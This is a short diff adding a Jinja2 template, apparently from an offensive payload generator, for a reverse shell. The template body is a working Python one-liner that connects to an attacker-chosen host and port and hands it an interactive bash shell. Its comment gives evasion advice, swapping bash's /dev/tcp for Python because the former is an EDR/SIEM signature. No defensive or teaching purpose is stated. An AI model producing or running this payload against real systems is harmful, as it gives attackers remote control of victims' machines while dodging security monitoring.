@@ -1,0 +1,7 @@
+{# templates/shells/bash_reverse.j2
+   Bash reverse shell.
+   OPSEC: /dev/tcp is an EDR/SIEM signature; this template uses Python as
+   the transport layer to avoid the bash built-in redirection entirely.
+   Variables: lhost (str), lport (int)
+#}
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('{{ lhost }}',{{ lport }}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/bash','-i'])"
